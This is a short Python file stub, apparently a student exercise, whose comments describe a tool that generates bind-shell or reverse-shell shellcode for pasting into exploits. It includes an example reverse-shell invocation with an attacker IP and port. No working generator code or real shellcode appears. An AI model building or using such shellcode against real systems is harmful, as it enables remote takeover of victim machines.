import sys

#python3 payload.py -b <port>          #bind shell, port number of victim machine 
#python3 payload.py -r <IP> <port>     #reverse shell, attacker's IP and port

#Example:  python3 payload.py -r 19.168.1.25 3333
    #Output: - a string that can be copied into an exploit for future projects
    #        - display the total number of bytes in the shellcode
    #        - produce a warning if either the IP address or port number contains a null value or newline value
    #EXAMPLE OUTPUT: Total 80 bytes
    #                shellcode = “\xFF\xFF\xFF...”
    #EXAMPLE OUTPUT 2: Warning: IP address contains \x00
    #                  Total 80 bytes
    #                  shellcode = “\xFF\x00\xFF...”
